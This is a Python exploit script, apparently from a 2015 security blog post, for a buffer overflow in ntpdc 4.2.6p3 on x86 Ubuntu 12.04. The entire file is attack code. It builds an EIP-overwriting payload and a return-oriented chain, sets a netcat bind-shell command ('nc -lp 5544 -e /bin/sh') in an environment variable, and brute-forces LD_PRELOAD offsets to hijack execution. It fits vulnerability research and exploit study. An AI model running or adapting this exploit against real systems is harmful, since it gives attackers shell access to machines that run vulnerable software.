# Source: https://hatriot.github.io/blog/2015/01/06/ntpdc-exploit/
 
from os import system, environ
from struct import pack
import sys
 
#
# ntpdc 4.2.6p3 bof
# @dronesec
# tested on x86 Ubuntu 12.04.5 LTS
#
 
IMAGE_BASE = 0x80000000
LD_INITIAL_OFFSET = 8900
LD_TAIL_OFFSET = 1400
 
sploit = "\x41" * 485        # junk
sploit += pack("<I", IMAGE_BASE + 0x000143e0) # eip
sploit += "\x41" * 79        # junk
sploit += pack("<I", IMAGE_BASE + 0x0002678d) # location -0x14/-0x318 
from shellcode
 
ld_pl = ""
ld_pl += pack("<I", 0xeeffffff) # ESI
ld_pl += pack("<I", 0x11366061) # EDI
ld_pl += pack("<I", 0x41414141) # EBP
ld_pl += pack("<I", IMAGE_BASE + 0x000138f2) # ADD EDI, ESI; RET
ld_pl += pack("<I", IMAGE_BASE + 0x00022073) # CALL EDI
ld_pl += pack("<I", 0xbffff60d) # payload addr based on empty env; 
probably wrong
 
environ["EGG"] = "/bin/nc -lp 5544 -e /bin/sh"
 
for idx in xrange(200):
 
    for inc in xrange(200):
 
        ld_pl = ld_pl + "\x41" * (LD_INITIAL_OFFSET + idx)
        ld_pl += "\x43" * (LD_INITIAL_OFFSET + inc)
 
        environ["LD_PRELOAD"] = ld_pl
        system("echo %s | ntpdc 2>&1" % sploit)

